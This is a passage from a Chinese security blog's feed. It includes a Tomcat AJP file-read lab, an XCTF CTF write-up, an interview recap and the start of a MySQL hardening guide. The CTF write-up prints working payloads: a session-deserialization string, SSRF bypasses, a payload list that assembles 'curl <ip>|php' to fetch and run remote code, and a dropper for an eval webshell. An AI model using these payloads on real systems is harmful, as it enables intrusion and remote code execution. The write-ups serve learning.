class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染.</span><br></pre></td></tr></table></figure><p>原型链污染一般会出现在<code>对象或数组</code>的<code>键名或属性名</code>可控,而且是<code>赋值语句</code>的情况下 ：例如对象合并merge、对象clone。 </p><p>CTF题目参考链接：</p><p><a href="https://www.freebuf.com/column/216381.html" target="_blank" rel="noopener">https://www.freebuf.com/column/216381.html</a> </p><p><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/200406.html</a> </p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>最近事情太多了，应接不暇。希望早点结束这些麻烦事情，早日轻松，冲冲冲！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JS原型污染链&quot;&gt;&lt;a href=&quot;#JS原型污染链&quot; class=&quot;headerlink&quot; title=&quot;JS原型污染链&quot;&gt;&lt;/a&gt;JS原型污染链&lt;/h1&gt;&lt;p&gt;JS中一种很有意思的漏洞，利用了JS中原型的特性，特此记录。&lt;/p&gt;
&lt;p&gt;在正式进入之前先说一下c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含</title>
    <link href="http://bai-ren-1.github.io/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-03-13T07:01:41.000Z</published>
    <updated>2020-03-17T06:07:15.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat文件包含"><a href="#Tomcat文件包含" class="headerlink" title="Tomcat文件包含"></a>Tomcat文件包含</h1><p>漏洞地址：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938</a> ，由于Tomcat处理ajp协议存在缺陷导致攻击者可以构造恶意数据包进行文件包含，获取Tomcat服务器上的文件信息。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里我使用的是ubuntu的docker来搭建我们的Tomcat环境，首先通过docker search找到tomcat具体8.5版本的镜像，然后通过docker pull拉取镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search tomcat-<span class="number">8.5</span>.<span class="number">32</span></span><br><span class="line">docker pull duonghuuphuc/tomcat-<span class="number">8.5</span>.<span class="number">32</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png" alt></p><p>镜像拉取完成后可以通过docker iamges来查看镜像，随后我们运行我们的tomcat镜像。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:8080 -p 8009:8009 --name bairen duonghuuphuc/tomcat-8.5.32</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt></p><p>开启了镜像的8080和8009（处理ajp协议的端口）端口，验证是否开启成功：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" alt></p><p>可以看到nmap成功扫描出目标靶机开启了8009端口处理ajp协议。</p><h2 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h2><p> EXP来源：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a> </p><p>我打完EXP忘记截图了，重新开启一下docker镜像实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start f283f2dd7396</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/6.png" alt></p><p>然后执行我们的EXP，可以看到成功读取出/WEB-INF/web.xml的信息：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png" alt></p><p>关闭docker环境：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png" alt></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>记录一下，用来学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat文件包含&quot;&gt;&lt;a href=&quot;#Tomcat文件包含&quot; class=&quot;headerlink&quot; title=&quot;Tomcat文件包含&quot;&gt;&lt;/a&gt;Tomcat文件包含&lt;/h1&gt;&lt;p&gt;漏洞地址：&lt;a href=&quot;https://cve.mitre.org/cg
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>XCTF之Hackme</title>
    <link href="http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/"/>
    <id>http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/</id>
    <published>2020-03-10T08:07:43.000Z</published>
    <updated>2020-03-18T08:14:24.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF之Hackme"><a href="#XCTF之Hackme" class="headerlink" title="XCTF之Hackme"></a>XCTF之Hackme</h1><p>因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战疫开始，就看了一下。这道题参考了很多题目比较综合，特此记录。环境已经关闭所以没有源码，核心的绕法和payload的意义会详细解释。最核心考点少于四字的命令执行具体情景和 hitcon 2017类似。</p><p>思路分析</p><p>下载源码审计，看到了可以构造反序列化控制admin的值为1。执行成功反序列化后进入核心题目，核心思路是绕过ssrf后进行一个命令字数小于4的命令执行。</p><h2 id="参考题目"><a href="#参考题目" class="headerlink" title="参考题目"></a>参考题目</h2><p>hitcon 2017 revenge <a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">https://findneo.github.io/171110Bypass4CLimit/</a></p><p>Byte 2019 CTF  <a href="https://blog.csdn.net/a3320315/article/details/102989485/" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102989485/</a> </p><h2 id="Part1-Session反序列化"><a href="#Part1-Session反序列化" class="headerlink" title="Part1 - Session反序列化"></a>Part1 - Session反序列化</h2><blockquote><p> Session反序列化漏洞：在<strong>设置 session 和读取 session 两个阶段</strong>中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。 </p><p>PHP 获取到 session 字符串后，就开始查找<strong>第一个 |</strong>（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。（可利用点：<strong>键值天生就是如果是序列化字符的话，可以直接被反序列。可用来绕过某些构造方法的变量值限定</strong>）</p></blockquote><h4 id="1-PHP-Session-序列化及反序列化处理器"><a href="#1-PHP-Session-序列化及反序列化处理器" class="headerlink" title="1) PHP Session 序列化及反序列化处理器"></a>1) PHP Session 序列化及反序列化处理器</h4><p>PHP 内置了多种处理器用于<strong>存取 $_SESSION 数据</strong>时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize (php&gt;=5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><h4 id="2-配置选项-session-serialize-handler"><a href="#2-配置选项-session-serialize-handler" class="headerlink" title="2) 配置选项 session.serialize_handler"></a>2) 配置选项 session.serialize_handler</h4><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler<span class="string">"php"</span>PHP_INI_ALL</span><br></pre></td></tr></table></figure><h4 id="3-安全隐患"><a href="#3-安全隐患" class="headerlink" title="3) 安全隐患"></a>3) 安全隐患</h4><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure><p>例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"ryat"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure><p>在<strong>读取数据时</strong>如果用的反序列化处理器不是 php_serialize，而<strong>是 php</strong> 的话，那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>ryat<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过注入 <code>|</code> 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）</p><blockquote><p>即是PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。 </p></blockquote><h3 id="4-回归题目分析"><a href="#4-回归题目分析" class="headerlink" title="4)回归题目分析"></a>4)回归题目分析</h3><p>我们访问upload文件可以看到，它包含的是他目录下面的<code>init.php</code>。其中存入<code>session</code>使用的是<code>php_serialize</code>模式</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/8.png" alt></p><p>然后我们看我们的目标<code>/core/index.php</code>，里面也包含了一个<code>init.php</code>进行session配置，不过这个<code>init.php</code>跟上面的不一样</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/9.png" alt></p><p>这就导致<code>/core/index.php</code>访问session时和刚刚存储使用的session不同，导致解析漏洞。<strong>会自动将|后面的进行反序列化</strong>，这就实例化了info类，绕过他的构造函数对admin的控制了，成功让admin为1。</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/10.png" alt></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"sign"</span>: <span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:5:"shabi";&#125;'</span></span><br></pre></td></tr></table></figure><p>获取到源码并进入Part2，进入ssrf的绕过：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/11.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/baidu.com?,payload</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/plain;base64,payload</span></span><br></pre></td></tr></table></figure><h2 id="Part2-SSRF绕法"><a href="#Part2-SSRF绕法" class="headerlink" title="Part2 - SSRF绕法"></a>Part2 - SSRF绕法</h2><h3 id="1-参考连接"><a href="#1-参考连接" class="headerlink" title="1) 参考连接"></a>1) 参考连接</h3><p>【SSRF】如何绕过filter_var, preg_match和 parse_url <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a> </p><h3 id="2-回归题目分析"><a href="#2-回归题目分析" class="headerlink" title="2)回归题目分析"></a>2)回归题目分析</h3><ul><li>FILTER_VALIDATE_URL 过滤器把值作为URL来验证 。</li><li>compress.zlib://data: 绕过 preg_match 对直接使用data协议data://的绕过 。</li><li>@：绕过 preg_match 对域名为127.0.0.1的绕过。</li><li>file_get_content：绕过本地文件读取直接接受payload的值。</li></ul><blockquote><p>关于绕过filter_var和parse_url，在file_get_contents的情况下，可以用data://伪协议来绕过，对于这样的形式data://text/plain;base64,xxxxx，parse_url会将text作为host，并且PHP对MIME不敏感，改为这样data://baidu.com/plain;base64,xxxxx就能绕过，并且file_get_contents能直接读取到xxxx的内容。由于题目已经禁止了以data开头，所以我们可以用compress.zlib</p></blockquote><h2 id="Linux特性"><a href="#Linux特性" class="headerlink" title="Linux特性"></a>Linux特性</h2><p>EXP里面使用的了一些Linux特性，这里简单的复现一下。</p><h3 id="1-命令可以通过-符号断续执行"><a href="#1-命令可以通过-符号断续执行" class="headerlink" title="1) 命令可以通过 \ 符号断续执行"></a>1) 命令可以通过 \ 符号断续执行</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/1.png" alt></p><p>通过\对命令进行截断，我们最后可以断续的构造出<code>echo 111</code>这个命令。</p><h3 id="2-通过重定向-gt-符号新建文件"><a href="#2-通过重定向-gt-符号新建文件" class="headerlink" title="2) 通过重定向 &gt; 符号新建文件"></a>2) 通过重定向 &gt; 符号新建文件</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/2.png" alt></p><p>重定向就不说了，简单标注 &gt; 和 &gt;&gt; 的区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加；</span><br><span class="line">&gt; 是覆盖；</span><br></pre></td></tr></table></figure><p>上例中我通过 &gt; 新建了一个空文件 <code>shabi</code>。</p><h3 id="3-通过命令-sh-执行文件内容"><a href="#3-通过命令-sh-执行文件内容" class="headerlink" title="3) 通过命令 sh 执行文件内容"></a>3) 通过命令 sh 执行文件内容</h3><p>当文件里面的内容是系统命令时，我们能通过 <code>sh 文件名</code>的形式来调用里面命令</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/3.png" alt></p><p>上例我新建shabi文件并写入 <code>echo &#39;you are shabi&#39;</code>，然后我通过<code>sh shabi</code>可见成功执行了其中的命令并打印出内容。</p><h2 id="Part3-命令执行绕法"><a href="#Part3-命令执行绕法" class="headerlink" title="Part3 - 命令执行绕法"></a>Part3 - 命令执行绕法</h2><p>核心payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">'&gt;dir'</span>,</span><br><span class="line"><span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line"><span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line"><span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line"><span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"><span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line"><span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"></span><br><span class="line"><span class="string">'*&gt;v'</span>,</span><br><span class="line"><span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line"><span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line"><span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;rev'</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"><span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></span><br><span class="line"><span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"><span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;p'</span>,</span><br><span class="line"><span class="string">'&gt;ph\\'</span>,</span><br><span class="line"><span class="string">'&gt;\|\\'</span>,</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line"><span class="string">'&gt;\ \\'</span>,</span><br><span class="line"><span class="string">'&gt;rl\\'</span>,</span><br><span class="line"><span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'sh '</span> + pos2,</span><br><span class="line"><span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line"><span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line"><span class="string">'sh '</span> + pos0,</span><br><span class="line"><span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br></pre></td></tr></table></figure><p>1.当payload执行到<strong>第五行</strong>命令时，可以看出：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/4.png" alt></p><ul><li>创建了五个文件dir、f&gt;、kt-、sl、v，目前仅v是内容非空的，其他为空。</li><li>v中的内容如上<code>f&gt;  kt- sl</code>。</li><li><code>*&gt;v</code>中<strong>*起通配符作用</strong>相当于<code>dir&gt;v</code>，即v的内容<code>f&gt; kt- sl</code>。</li></ul><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/6.png" alt></p><p>2.当继续执行<strong>第六行</strong>命令直到发生魔法那行命令：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/5.png" alt></p><ul><li>新创建了rev空文件，用来起通配作用。</li><li>使用<code>*v&gt;g</code>，这里注意<strong>*起通配符作用</strong>相当于 <code>rev v&gt;g</code>，即把<code>v</code>中内容反序写入g，即g的内容<code>ls -tk &gt;f</code>，目的是为了把命令拆分成文件名，并因为ls的-t选项按<strong>时间排序</strong>，来达成写入文件命令的作用。</li></ul><p>3.当从下面新的截断命令开始到继续执行完命令：</p><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/7.png" alt></p><p>可以看到ls -t的作用就能把这些<strong>通过时间来逆序</strong>把文件名拼接成有顺序的命令。</p><ul><li><code>sh pos2</code>即<code>sh g</code>，通过执行f的内容ls -tk并写入到文件f中</li><li><code>sh pos0</code>即<code>sh f</code>，即执行f的内容（ls -tk的结果，即curl那条命令）去访问服务器的php文件并下载</li></ul><p>4.我们在服务器部署好马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php file_put_contents(\"hh.php\", \"&lt;?php eval(\\\$_GET[c]);?&gt;\");?&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面执行命令后就会请求并下载这个马，我们在访问沙盒下生成的hh.php就能获得flag了</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>附上这次比赛的wp：<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。" target="_blank" rel="noopener">https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF之Hackme&quot;&gt;&lt;a href=&quot;#XCTF之Hackme&quot; class=&quot;headerlink&quot; title=&quot;XCTF之Hackme&quot;&gt;&lt;/a&gt;XCTF之Hackme&lt;/h1&gt;&lt;p&gt;因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>面试腾讯</title>
    <link href="http://bai-ren-1.github.io/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/"/>
    <id>http://bai-ren-1.github.io/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/</id>
    <published>2020-03-06T10:32:26.000Z</published>
    <updated>2020-03-06T11:56:30.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面试腾讯"><a href="#面试腾讯" class="headerlink" title="面试腾讯"></a>面试腾讯</h1><p>面试梦想中的腾讯，本以为做足了准备，还是缺少了很多事情（很多基础的知识得及时去复习，不然就会以为自己还记得，其实已经不记得了），有些沮丧。但很感谢面试官和耐心地一步一步引导我，让我又有了新的准备方向。</p><h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><ul><li>具体经历介绍，很具体包括过程，思路，收获（比赛，学到的漏洞和漏洞拓展的具体过程）</li><li>介绍一种熟悉漏洞，并说出怎么防御，并说出怎么绕过这个防御（关于XSS的防御的变化）</li><li>问根据上面的防御和自己的进攻模拟攻防（防御就用普通CSP加上对其的进攻绕过）</li><li>问漏扫项目怎么处理目录遍历这种路径一层一层的情况（枚举）</li><li>问怎么优化这个问题（得好好思考一下）</li><li>问SQL注入的最本质是什么（答语法结构改变，这个并非最根源的原因）</li><li>追问是SQL注入本质，为什么C不会呢（解析）</li><li>问有没有破解过游戏或者软件（crackme）</li><li>问32位int、unsign int所占字节数（4字节，也是4字节，出错于记忆和理解出错，难受了）</li><li>问具体过程（答了一种很简单的验证码绕过）</li><li>pe结构（会，但具体有些遗忘）</li><li>怎么给一个进程免杀（守护进程和hook api？）</li><li>文件水印算法（没有听说过）</li><li>问怎么设计一个水印算法（答文件分块后每块按哈希加密后拼接在后边）</li><li>如何对水印使用动态校验（得好好思考一下）</li><li>sql语句的编写（很难受，因为明明应该很流畅的，下面有复现）</li><li>为什么不能用order by然后limit？（只能选一条）</li><li>问一个具体场景的指针（更难受的地方，太久没使用把最基础的遗忘了还自以为准备充分）</li><li>问开发了一个第三方的API得注意什么（不被泄露给其他第三方，配置隐私）</li><li>给出具体场景就是一个根据id索引给出资料的API（不能枚举越权、SQL注入防止）</li><li>问答</li></ul><p>下面就那些比较简单的答案复现一下，以敲响警钟要全面和扎实一点。</p><h2 id="答案复现"><a href="#答案复现" class="headerlink" title="答案复现"></a>答案复现</h2><h3 id="占字节数"><a href="#占字节数" class="headerlink" title="占字节数"></a>占字节数</h3><ul><li><p>32位编译器：</p><ul><li><p>char：1个字节</p></li><li><p>short int : 2个字节</p></li><li><p>int： 4个字节</p></li><li><p>unsigned int : 4个字节</p></li><li><p>float: 4个字节</p></li><li><p>double:  8个字节</p></li><li><p>long:  4个字节</p></li><li><p>long long: 8个字节</p></li><li><p>unsigned long: 4个字节 </p></li></ul></li><li><p>64位编译器：</p><ul><li>short int : 2个字节</li><li>int： 4个字节</li><li>unsigned int : 4个字节</li><li>float: 4个字节</li><li>double:  8个字节</li><li>long:  4个字节</li><li>long long: 8个字节</li><li>unsigned long: 4个字节 </li><li>unsigned long: 8个字节 </li></ul></li></ul><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><ul><li>找出成绩最高的学生的id：</li></ul><p><img src="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/2.png" alt></p><p>顺便提醒了自己有关<strong>多表查询、子查询、谓词</strong>的复习</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>这个是最难受，连最简单指针的使用形式都忘记了，提醒自己得复习<strong>指针，引用，C++特性,数据结构</strong></p><p><img src="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/1.png" alt></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>继续深入挖掘漏洞，在攻防研究可以继续深入，进步还是比较快和大的。</li><li>不只是深入web安全，要把二进制相关的更进一步的学好（不能浅尝辄止）。</li><li>批评在开发基础的表现，不能学了安全就只把目光放在那几款安全开发。</li><li>复习数据结构，计网，操作系统等知识。</li></ul><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>新的计划，得抽更多时间来进行了。加油，继续冲击腾讯！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;面试腾讯&quot;&gt;&lt;a href=&quot;#面试腾讯&quot; class=&quot;headerlink&quot; title=&quot;面试腾讯&quot;&gt;&lt;/a&gt;面试腾讯&lt;/h1&gt;&lt;p&gt;面试梦想中的腾讯，本以为做足了准备，还是缺少了很多事情（很多基础的知识得及时去复习，不然就会以为自己还记得，其实已经不记得了
      
    
    </summary>
    
    
      <category term="倾谈" scheme="http://bai-ren-1.github.io/categories/%E5%80%BE%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL安全配置</title>
    <link href="http://bai-ren-1.github.io/2020/03/04/MySQL%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/04/MySQL%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-04T05:37:57.000Z</published>
    <updated>2020-03-04T07:46:43.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL安全配置"><a href="#MySQL安全配置" class="headerlink" title="MySQL安全配置"></a>MySQL安全配置</h1><p>本文转载自 <a href="https://blog.csdn.net/ilnature2008/article/details/54587553?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/ilnature2008/article/details/54587553?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a> </p><h2 id="0x00-Mysql配置文件"><a href="#0x00-Mysql配置文件" class="headerlink" title="0x00 Mysql配置文件"></a>0x00 Mysql配置文件</h2><ul><li>linux系统下是<code>my.conf</code></li><li>windows环境下是<code>my.ini</code></li></ul><p>下面以mysql 5.7版本为例，介绍mysql常见的安全策略、配置、加固方式等等，有些策略可能只针对Linux操作系统，更多策略可以参考<code>CIS Mysql Benchmark</code>相关文档</p><h2 id="0x01-操作系统级别安全配置"><a href="#0x01-操作系统级别安全配置" class="headerlink" title="0x01 操作系统级别安全配置"></a>0x01 操作系统级别安全配置</h2><h3 id="1-不要将数据库放在系统分区"><a href="#1-不要将数据库放在系统分区" class="headerlink" title="1. 不要将数据库放在系统分区"></a>1. 